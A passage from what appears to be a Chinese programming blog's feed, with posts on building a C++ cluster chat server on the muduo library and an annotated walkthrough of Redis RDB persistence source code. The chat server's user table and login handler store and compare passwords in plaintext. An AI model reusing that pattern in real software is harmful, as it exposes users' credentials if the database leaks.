class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中主要的代码注释已经写出来了，注意由于<code>muduo</code>库已经帮我们实现了套接字的连接，我们只需要自己定义回调函数，即可让客户端连接时候以及客户端发送请求的时候进行自我回调。</br></p><blockquote><p>注意为什么要在<code>ChatServer</code>类中实现上述代码的构造函数</br></p></blockquote><p>我们去<code>muduo</code>中的<code>TcpServer</code>源码可知，<code>TcpServer</code>没有空的构造函数，所以我们必须要用初始化列表对<code>TcpServer</code>进行初始化。下面是<code>TcpServer</code>源码的构造函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TcpServer(EventLoop* loop, const InetAddress&amp; listenAddr);</span></span><br><span class="line"><span class="built_in">TcpServer</span>(EventLoop* loop,</span><br><span class="line">          <span class="type">const</span> InetAddress&amp; listenAddr,</span><br><span class="line">          <span class="type">const</span> string&amp; nameArg,</span><br><span class="line">          Option option = kNoReusePort);</span><br><span class="line">~<span class="built_in">TcpServer</span>();  <span class="comment">// force out-line dtor, for std::unique_ptr members.</span></span><br></pre></td></tr></table></figure><p>以下代码是<code>ChatServer</code>对应的实现细节</br></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">ChatServer::<span class="built_in">ChatServer</span>(EventLoop *loop,</span><br><span class="line">                       <span class="type">const</span> InetAddress &amp;listenAddr,</span><br><span class="line">                       <span class="type">const</span> string &amp;nameArg)</span><br><span class="line">    : _server(loop, listenAddr, nameArg), _loop(loop)</span><br><span class="line">&#123;</span><br><span class="line">    _server.<span class="built_in">setConnectionCallback</span>(<span class="built_in">bind</span>(&amp;ChatServer::onConnection, <span class="keyword">this</span>, _1));</span><br><span class="line"></span><br><span class="line">    _server.<span class="built_in">setMessageCallback</span>(<span class="built_in">bind</span>(&amp;ChatServer::onMessage, <span class="keyword">this</span>, _1, _2, _3));</span><br><span class="line"></span><br><span class="line">    _server.<span class="built_in">setThreadNum</span>(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChatServer::start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _server.<span class="built_in">start</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChatServer::onConnection</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 用户断开连接</span></span><br><span class="line">    <span class="keyword">if</span> (!conn-&gt;<span class="built_in">connected</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        conn-&gt;<span class="built_in">shutdown</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChatServer::onMessage</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, Buffer *buffer, Timestamp time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string buf = buffer-&gt;<span class="built_in">retrieveAllAsString</span>();</span><br><span class="line">    json js = json::<span class="built_in">parse</span>(buf);</span><br><span class="line">    <span class="comment">// 通过js中的id来获取一个handler，这样把网络模块和业务模块分开</span></span><br><span class="line">    <span class="comment">// 转换成int类型</span></span><br><span class="line">    <span class="keyword">auto</span> handler = ChatService::<span class="built_in">instance</span>()-&gt;<span class="built_in">getHandler</span>(js[<span class="string">&quot;msgid&quot;</span>].<span class="built_in">get</span>&lt;<span class="type">int</span>&gt;());</span><br><span class="line">    <span class="comment">// handler在执行的时候才知道是login还是reg</span></span><br><span class="line">    <span class="built_in">handler</span>(conn, js, time);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意在<code>onMessage</code>方法中，我们为了把网络模块和业务模块分开，采用的是回调机制，将<code>msgid</code>和消息对应的处理函数绑定起来，然后当一个消息接受到之后，利用<code>json</code>库对<code>msgid</code>进行解析，从而自动回调对应的处理函数。</p><h1 id="ChatService"><a href="#ChatService" class="headerlink" title="ChatService"></a>ChatService</h1><p>该类主要就是针对<code>msgid</code>和对应的<code>handler</code>进行绑定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ChatService</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 获取单例</span></span><br><span class="line">    <span class="function"><span class="type">static</span> ChatService *<span class="title">instance</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理登录业务</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">login</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, json &amp;js, Timestamp)</span></span>;</span><br><span class="line">    <span class="comment">// 处理注册业务</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reg</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, json &amp;js, Timestamp)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取消息对应的处理器</span></span><br><span class="line">    <span class="function">MsgHandler <span class="title">getHandler</span><span class="params">(<span class="type">int</span> msgid)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">ChatService</span>();</span><br><span class="line">    <span class="comment">// 存储消息id和业务处理的方法</span></span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, MsgHandler&gt; _msgHandlerMap;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>为了进行绑定操作，我们在<code>ChatService</code>构造函数直接将<code>msgid</code>和对应<code>handler</code>进行绑定</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册消息以及对应的回调操作</span></span><br><span class="line">ChatService::<span class="built_in">ChatService</span>()</span><br><span class="line">&#123;</span><br><span class="line">    _msgHandlerMap.<span class="built_in">insert</span>(&#123;LOGIN_MSG, std::<span class="built_in">bind</span>(&amp;ChatService::login, <span class="keyword">this</span>, _1, _2, _3)&#125;);</span><br><span class="line">    _msgHandlerMap.<span class="built_in">insert</span>(&#123;REG_MSG, std::<span class="built_in">bind</span>(&amp;ChatService::reg, <span class="keyword">this</span>, _1, _2, _3)&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>std::bind</code>的语法大家可以自行百度，其实可以理解为一种函数指针，将<code>LOGIN_MSG</code>和<code>ChatService::login</code>绑定起来，当收到<code>LOGIN_MSG</code>，自动去调用<code>ChatService::login</code>方法。然后我们主要是实现登陆和注册两个函数的具体代码。</p><h1 id="数据库建立"><a href="#数据库建立" class="headerlink" title="数据库建立"></a>数据库建立</h1><p>为了实现登陆和注册功能，我们需要自行建立对应的数据库，我们这里使用的<code>MySQL</code>数据库。对应的<code>user</code>表如下：</p><table><thead><tr><th align="center">字段名称</th><th align="center">字段类型</th><th align="center">字段说明</th><th align="center">约束</th></tr></thead><tbody><tr><td align="center">id</td><td align="center">INT</td><td align="center">用户id</td><td align="center">PRIMARY KEY、AUTO_INCREMENT</td></tr><tr><td align="center">name</td><td align="center">VARCHAR(50)</td><td align="center">用户名</td><td align="center">NOT NULL, UNIQUE</td></tr><tr><td align="center">password</td><td align="center">VARCHAR(50)</td><td align="center">用户密码</td><td align="center">NOT NULL</td></tr><tr><td align="center">state</td><td align="center">ENUM(‘online’, ‘offline’)</td><td align="center">当前登录状态</td><td align="center">DEFAULT ‘offline’</td></tr><tr><td align="center">然后对登陆和注册函数进行实现</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理登录业务</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChatService::login</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, json &amp;js, Timestamp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> id = js[<span class="string">&quot;id&quot;</span>].<span class="built_in">get</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">    string password = js[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    User user = _usermodel.<span class="built_in">query</span>(id);</span><br><span class="line">    <span class="keyword">if</span> (user.<span class="built_in">getId</span>() == id &amp;&amp; user.<span class="built_in">getPwd</span>() == password)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="built_in">getState</span>() == <span class="string">&quot;online&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 用户已经登陆，不允许重复登陆</span></span><br><span class="line">            json response;</span><br><span class="line">            response[<span class="string">&quot;msgid&quot;</span>] = LOGIN_MSG_ACK;</span><br><span class="line">            response[<span class="string">&quot;error&quot;</span>] = <span class="number">2</span>; <span class="comment">// 2表示已经登陆</span></span><br><span class="line">            response[<span class="string">&quot;errormsg&quot;</span>] = <span class="string">&quot;已经登陆，不允许重复登陆&quot;</span>;</span><br><span class="line">            conn-&gt;<span class="built_in">send</span>(response.<span class="built_in">dump</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//登陆成功，然后更新用户登陆信息</span></span><br><span class="line">            user.<span class="built_in">setState</span>(<span class="string">&quot;online&quot;</span>);</span><br><span class="line">            _usermodel.<span class="built_in">updateState</span>(user);</span><br><span class="line">            json response;</span><br><span class="line">            response[<span class="string">&quot;msgid&quot;</span>] = LOGIN_MSG_ACK;</span><br><span class="line">            response[<span class="string">&quot;error&quot;</span>] = <span class="number">0</span>; <span class="comment">//0表示成功</span></span><br><span class="line">            response[<span class="string">&quot;id&quot;</span>] = user.<span class="built_in">getId</span>();</span><br><span class="line">            response[<span class="string">&quot;name&quot;</span>] = user.<span class="built_in">getName</span>();</span><br><span class="line">            conn-&gt;<span class="built_in">send</span>(response.<span class="built_in">dump</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 该用户不存在</span></span><br><span class="line">        json response;</span><br><span class="line">        response[<span class="string">&quot;msgid&quot;</span>] = LOGIN_MSG_ACK;</span><br><span class="line">        response[<span class="string">&quot;error&quot;</span>] = <span class="number">1</span>; <span class="comment">//1表示不存在</span></span><br><span class="line">        response[<span class="string">&quot;errormsg&quot;</span>] = <span class="string">&quot;用户名或密码不存在&quot;</span>;</span><br><span class="line">        conn-&gt;<span class="built_in">send</span>(response.<span class="built_in">dump</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 处理注册业务</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChatService::reg</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, json &amp;js, Timestamp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string name = js[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    string password = js[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line">    User user;</span><br><span class="line">    user.<span class="built_in">setName</span>(name);</span><br><span class="line">    user.<span class="built_in">setPwd</span>(password);</span><br><span class="line">    <span class="type">bool</span> ans = _usermodel.<span class="built_in">insert</span>(user);</span><br><span class="line">    <span class="keyword">if</span> (ans)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 注册成功</span></span><br><span class="line">        json response;</span><br><span class="line">        response[<span class="string">&quot;msgid&quot;</span>] = REG_MSG_ACK;</span><br><span class="line">        response[<span class="string">&quot;error&quot;</span>] = <span class="number">0</span>; <span class="comment">//0表示成功</span></span><br><span class="line">        response[<span class="string">&quot;id&quot;</span>] = user.<span class="built_in">getId</span>();</span><br><span class="line">        conn-&gt;<span class="built_in">send</span>(response.<span class="built_in">dump</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 注册失败</span></span><br><span class="line">        json response;</span><br><span class="line">        response[<span class="string">&quot;msgid&quot;</span>] = REG_MSG_ACK;</span><br><span class="line">        response[<span class="string">&quot;error&quot;</span>] = <span class="number">1</span>; <span class="comment">//1表示失败</span></span><br><span class="line">        conn-&gt;<span class="built_in">send</span>(response.<span class="built_in">dump</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意我们同样在这里使用低耦合思想，把业务和数据库模块分开，注意<code>_usermodel.query(id)</code>这一句，其实<code>query</code>就是其中数据库的操作模块，里面才是具体的数据库语句。</p><p>这样建立了<code>ChatServer</code>后，就可以在<code>main</code>函数中直接启动</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EventLoop loop;</span><br><span class="line"><span class="function">InetAddress <span class="title">addr</span><span class="params">(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6000</span>)</span></span>;</span><br><span class="line"><span class="function">ChatServer <span class="title">server</span><span class="params">(&amp;loop, addr, <span class="string">&quot;ChatServer&quot;</span>)</span></span>;</span><br><span class="line">server.<span class="built_in">start</span>();</span><br><span class="line">loop.<span class="built_in">loop</span>();</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本次主要是对&lt;code&gt;Chatserver&lt;/code&gt;和&lt;code&gt;Chatservice&lt;/code&gt;进行代码实现&lt;/p&gt;</summary>
    
    
    
    <category term="集群聊天服务器" scheme="http://www.shicoder.top/categories/%E9%9B%86%E7%BE%A4%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>集群聊天服务器一</title>
    <link href="http://www.shicoder.top/posts/3205092403.html"/>
    <id>http://www.shicoder.top/posts/3205092403.html</id>
    <published>2022-04-21T02:45:53.000Z</published>
    <updated>2022-04-26T09:17:12.433Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>本系列主要是利用C++开发一个集群聊天服务器项目，同时代码也会同步更新到<a href="https://github.com/shilinlun/ChatServer">github</a>上面<br>本项目目标为如下几点:</p><span id="more"></span><ol><li>集群聊天服务器设计，软件分层设计思路</li><li>用muduo网络库实现高性能的聊天服务器</li><li>用cmake构建项目集成编译环境</li><li>集群环境负载均衡器介绍以及nginx的tcp负载均衡配置以及应用</li><li>基于发布-订阅（观察者模式）的服务器中间件消息队列redis解决集群环境中跨服务器聊天通信</li><li>mysql数据库编程以及如何根据项目需求合理设计表结构</li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本系列主要是利用C++开发一个集群聊天服务器项目，同时代码也会同步更新到&lt;a href=&quot;https://github.com/shilinlun/ChatServer&quot;&gt;github&lt;/a&gt;上面&lt;br&gt;本项目目标为如下几点:&lt;/p&gt;</summary>
    
    
    
    <category term="集群聊天服务器" scheme="http://www.shicoder.top/categories/%E9%9B%86%E7%BE%A4%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分类" scheme="http://www.shicoder.top/tags/%E5%88%86%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>redis持久化</title>
    <link href="http://www.shicoder.top/posts/3707414788.html"/>
    <id>http://www.shicoder.top/posts/3707414788.html</id>
    <published>2022-04-15T02:59:18.000Z</published>
    <updated>2022-04-26T09:14:36.197Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>本次主要是对redis中著名的持久化策略进行代码层面描述，主要包括RDB持久化和AOF持久化</p><span id="more"></span><p>因为AOF文件的更新频率比RDB高，所以如果服务器开启AOF持久化，redis优先使用AOF文件还原，只有当AOF持久化关闭，才使用RDB文件进行还原</p><h1 id="RDB持久化"><a href="#RDB持久化" class="headerlink" title="RDB持久化"></a>RDB持久化</h1><p>RDB持久化主要有两个命令实现：<code>SAVE</code>和<code>BGSAVE</code></p><h2 id="SAVE、BGSAVE"><a href="#SAVE、BGSAVE" class="headerlink" title="SAVE、BGSAVE"></a><code>SAVE</code>、<code>BGSAVE</code></h2><ul><li><code>SAVE</code>会阻塞redis服务器，知道RDB文件创建完毕</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">saveCommand</span><span class="params">(redisClient *c)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// BGSAVE 已经在执行中，不能再执行 SAVE</span></span><br><span class="line">    <span class="comment">// 否则将产生竞争条件</span></span><br><span class="line">    <span class="keyword">if</span> (server.rdb_child_pid != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">addReplyError</span>(c,<span class="string">&quot;Background save already in progress&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 执行 </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">rdbSave</span>(server.rdb_filename) == REDIS_OK) &#123;</span><br><span class="line">        <span class="built_in">addReply</span>(c,shared.ok);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">addReply</span>(c,shared.err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>BGSAVE</code>不会阻塞，他会创建一个子进程，由子进程处理RDB文件保存</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">bgsaveCommand</span><span class="params">(redisClient *c)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 不能重复执行 BGSAVE</span></span><br><span class="line">    <span class="keyword">if</span> (server.rdb_child_pid != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">addReplyError</span>(c,<span class="string">&quot;Background save already in progress&quot;</span>);</span><br><span class="line">    <span class="comment">// 不能在 BGREWRITEAOF 正在运行时执行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (server.aof_child_pid != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">addReplyError</span>(c,<span class="string">&quot;Can&#x27;t BGSAVE while AOF log rewriting is in progress&quot;</span>);</span><br><span class="line">    <span class="comment">// 执行 BGSAVE</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">rdbSaveBackground</span>(server.rdb_filename) == REDIS_OK) &#123;</span><br><span class="line">        <span class="built_in">addReplyStatus</span>(c,<span class="string">&quot;Background saving started&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">addReply</span>(c,shared.err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rdbSaveBackground</span><span class="params">(<span class="type">char</span> *filename)</span> </span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> start;</span><br><span class="line">    <span class="comment">// 如果 BGSAVE 已经在执行，那么出错</span></span><br><span class="line">    <span class="keyword">if</span> (server.rdb_child_pid != <span class="number">-1</span>) <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">    <span class="comment">// 记录 BGSAVE 执行前的数据库被修改次数</span></span><br><span class="line">    server.dirty_before_bgsave = server.dirty;</span><br><span class="line">    <span class="comment">// 最近一次尝试执行 BGSAVE 的时间</span></span><br><span class="line">    server.lastbgsave_try = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// fork() 开始前的时间，记录 fork() 返回耗时用</span></span><br><span class="line">    start = <span class="built_in">ustime</span>();</span><br><span class="line">    <span class="keyword">if</span> ((childpid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> retval;</span><br><span class="line">        <span class="comment">/* 子进程 */</span></span><br><span class="line">        <span class="comment">// 关闭网络连接 fd</span></span><br><span class="line">        <span class="built_in">closeListeningSockets</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 设置进程的标题，方便识别</span></span><br><span class="line">        <span class="built_in">redisSetProcTitle</span>(<span class="string">&quot;redis-rdb-bgsave&quot;</span>);</span><br><span class="line">        <span class="comment">// 执行保存操作</span></span><br><span class="line">        retval = <span class="built_in">rdbSave</span>(filename);</span><br><span class="line">        <span class="comment">// 打印 copy-on-write 时使用的内存数</span></span><br><span class="line">        <span class="keyword">if</span> (retval == REDIS_OK) &#123;</span><br><span class="line">            <span class="type">size_t</span> private_dirty = <span class="built_in">zmalloc_get_private_dirty</span>();</span><br><span class="line">            <span class="keyword">if</span> (private_dirty) &#123;</span><br><span class="line">                <span class="built_in">redisLog</span>(REDIS_NOTICE,</span><br><span class="line">                    <span class="string">&quot;RDB: %zu MB of memory used by copy-on-write&quot;</span>,</span><br><span class="line">                    private_dirty/(<span class="number">1024</span>*<span class="number">1024</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 向父进程发送信号</span></span><br><span class="line">        <span class="built_in">exitFromChild</span>((retval == REDIS_OK) ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 父进程 */</span></span><br><span class="line">        <span class="comment">// 计算 fork() 执行的时间</span></span><br><span class="line">        server.stat_fork_time = <span class="built_in">ustime</span>()-start;</span><br><span class="line">        <span class="comment">// 如果 fork() 出错，那么报告错误</span></span><br><span class="line">        <span class="keyword">if</span> (childpid == <span class="number">-1</span>) &#123;</span><br><span class="line">            server.lastbgsave_status = REDIS_ERR;</span><br><span class="line">            <span class="built_in">redisLog</span>(REDIS_WARNING,<span class="string">&quot;Can&#x27;t save in background: fork: %s&quot;</span>,</span><br><span class="line">                <span class="built_in">strerror</span>(errno));</span><br><span class="line">            <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 打印 BGSAVE 开始的日志</span></span><br><span class="line">        <span class="built_in">redisLog</span>(REDIS_NOTICE,<span class="string">&quot;Background saving started by pid %d&quot;</span>,childpid);</span><br><span class="line">        <span class="comment">// 记录数据库开始 BGSAVE 的时间</span></span><br><span class="line">        server.rdb_save_time_start = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 记录负责执行 BGSAVE 的子进程 ID</span></span><br><span class="line">        server.rdb_child_pid = childpid;</span><br><span class="line">        <span class="comment">// 关闭自动 rehash</span></span><br><span class="line">        <span class="built_in">updateDictResizePolicy</span>();</span><br><span class="line">        <span class="keyword">return</span> REDIS_OK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> REDIS_OK; <span class="comment">/* unreached */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个命令内部都是执行<code>rdbSave</code>函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 